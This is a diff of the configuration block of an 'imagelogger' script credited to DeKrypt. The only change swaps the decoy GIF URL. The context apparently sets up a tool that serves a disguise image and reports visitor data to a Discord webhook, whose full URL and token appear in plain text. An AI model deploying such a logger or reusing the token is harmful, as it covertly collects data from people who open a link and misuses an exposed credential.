@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1353782937631588373/5ee_dp36mG10QatZ1gZ58RZyXLH1haSjhY1VsVzhGm15coe-aAYEAyBTTvXZIemkWErP",
-    "image": "https://tenor.com/view/orihime-bleach-anime-bleach-thousand-year-war-bread-girl-gif-26896618", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/view/orihime-bread-girl-orihime-bread-girl-orihime-bread-gif-26295826", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
